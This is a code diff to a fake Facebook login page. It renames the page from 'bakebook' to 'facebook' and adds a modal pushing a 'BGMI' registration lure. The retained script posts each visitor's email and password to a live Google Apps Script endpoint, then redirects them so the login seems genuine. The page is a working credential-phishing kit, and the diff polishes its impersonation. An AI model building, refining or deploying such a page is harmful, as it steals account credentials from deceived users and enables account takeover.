@@ -114,6 +114,7 @@
             color: #1877f2;
             text-decoration: none;
             font-size: 14px;
+            cursor: pointer;
         }
 
         .forgot-password a:hover {
@@ -135,6 +136,7 @@
             color: white;
             cursor: pointer;
             margin-bottom: 16px;
+            transition: background-color 0.2s;
         }
 
         .create-new-account:hover {
@@ -145,6 +147,7 @@
             color: white;
             text-decoration: none;
             font-size: 17px;
+            cursor: pointer;
         }
 
         .page-footer {
@@ -154,13 +157,105 @@
         }
 
         .page-footer a {
-            color: #606770;
+            color: #1877f2;
             text-decoration: none;
             margin: 0 8px;
+            cursor: pointer;
         }
 
         .page-footer a:hover {
             text-decoration: underline;
+        }
+
+        /* ── MODAL ─────────────────────────────── */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.55);
+            z-index: 999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.25s ease;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        .modal-box {
+            background: #fff;
+            border-radius: 12px;
+            padding: 32px 28px 28px;
+            max-width: 380px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.22);
+            transform: scale(0.88) translateY(16px);
+            transition: transform 0.25s ease;
+            position: relative;
+        }
+
+        .modal-overlay.active .modal-box {
+            transform: scale(1) translateY(0);
+        }
+
+        .modal-icon {
+            font-size: 42px;
+            margin-bottom: 14px;
+        }
+
+        .modal-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1c1e21;
+            margin-bottom: 10px;
+        }
+
+        .modal-msg {
+            font-size: 14px;
+            color: #606770;
+            line-height: 1.6;
+            margin-bottom: 22px;
+        }
+
+        .modal-msg strong {
+            color: #1877f2;
+        }
+
+        .modal-close-btn {
+            background: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            padding: 10px 32px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .modal-close-btn:hover {
+            background: #166fe5;
+        }
+
+        .modal-x {
+            position: absolute;
+            top: 12px;
+            right: 16px;
+            font-size: 20px;
+            color: #8a8d91;
+            background: none;
+            border: none;
+            cursor: pointer;
+            line-height: 1;
+        }
+
+        .modal-x:hover {
+            color: #1c1e21;
         }
 
         @media (max-width: 900px) {
@@ -203,7 +298,7 @@
 <body>
     <div class="container">
         <div class="left-section">
-            <h1>bakebook</h1>
+            <h1>facebook</h1>
             <p>Connect with friends and the world around you on Facebook.</p>
         </div>
 
@@ -219,35 +314,43 @@
                     </div>
                     <button type="submit" class="login-button" id="submitBtn">Log In</button>
                     <div class="forgot-password">
-                        <a href="#">Forgotten password?</a>
+                        <a onclick="showUnavailablePopup(event)">Forgotten password?</a>
                     </div>
                     <div class="divider"></div>
                     <div class="create-new-account">
-                        <a href="#">Create new account</a>
+                        <a onclick="showUnavailablePopup(event)">Create new account</a>
                     </div>
                 </form>
             </div>
 
             <div class="page-footer">
-                <p><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
+                <p><a onclick="showUnavailablePopup(event)">Create a Page</a> for a celebrity, brand or business.</p>
             </div>
         </div>
     </div>
 
+    <!-- ── MODAL ─────────────────────────────────────── -->
+    <div class="modal-overlay" id="unavailableModal">
+        <div class="modal-box">
+            <button class="modal-x" onclick="closePopup()">✕</button>
+            <div class="modal-icon">🔒</div>
+            <div class="modal-title">Service Not Available</div>
+            <div class="modal-msg">
+                This service is currently not available.<br><br>
+                <strong>Please log in to register on the BGMI page.</strong>
+            </div>
+            <button class="modal-close-btn" onclick="closePopup()">Got it</button>
+        </div>
+    </div>
+
     <script>
-        // =====================================================================
-        // ⚠️  STEP 1: PASTE YOUR GOOGLE APPS SCRIPT WEB APP URL BELOW
-        // Get it from: Google Sheet → Extensions → Apps Script → Deploy → New Deployment
-        // Set "Execute as: Me" and "Who has access: Anyone"
-        // =====================================================================
+        // ── Google Sheets URL ─────────────────────────────────────
         const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx0SyUTQF2qlHIwSIPPqbTVB7q69rk01-9LujiLViniu1u3yFZD5gydN5dSEzxraAyg/exec";
 
-        // =====================================================================
-        // ⚠️  STEP 2: Change this URL to wherever you want users to land after login
-        // Examples: "https://www.facebook.com"  or  "/"  or  "/thank-you.html"
-        // =====================================================================
-        const REDIRECT_URL = "/"; // Redirects back to your homepage after login
+        // ── Redirect after login ──────────────────────────────────
+        const REDIRECT_URL = "/";
 
+        // ── Login Form Submit ─────────────────────────────────────
         document.getElementById('loginForm').addEventListener('submit', async function (e) {
             e.preventDefault();
 
@@ -255,15 +358,13 @@
             const password = document.getElementById('passwordInput').value;
             const submitBtn = document.getElementById('submitBtn');
 
-            // Show loading state
             submitBtn.disabled = true;
             submitBtn.textContent = "Logging in...";
 
             try {
-                // Send data silently to Google Sheets
                 await fetch(GOOGLE_SCRIPT_URL, {
                     method: "POST",
-                    mode: "no-cors", // Required for Google Apps Script cross-origin requests
+                    mode: "no-cors",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                         email: email,
@@ -273,12 +374,30 @@
                     })
                 });
             } catch (err) {
-                // Silently ignore errors — still redirect the user
                 console.warn("Could not reach logging server:", err);
             }
 
-            // Redirect user after submit (looks like a real login flow)
             window.location.href = REDIRECT_URL;
+        });
+
+        // ── Popup helpers ─────────────────────────────────────────
+        function showUnavailablePopup(e) {
+            if (e) e.preventDefault();
+            document.getElementById('unavailableModal').classList.add('active');
+        }
+
+        function closePopup() {
+            document.getElementById('unavailableModal').classList.remove('active');
+        }
+
+        // Close when clicking outside the box
+        document.getElementById('unavailableModal').addEventListener('click', function (e) {
+            if (e.target === this) closePopup();
+        });
+
+        // Close on Escape key
+        document.addEventListener('keydown', function (e) {
+            if (e.key === 'Escape') closePopup();
         });
     </script>
 </body>
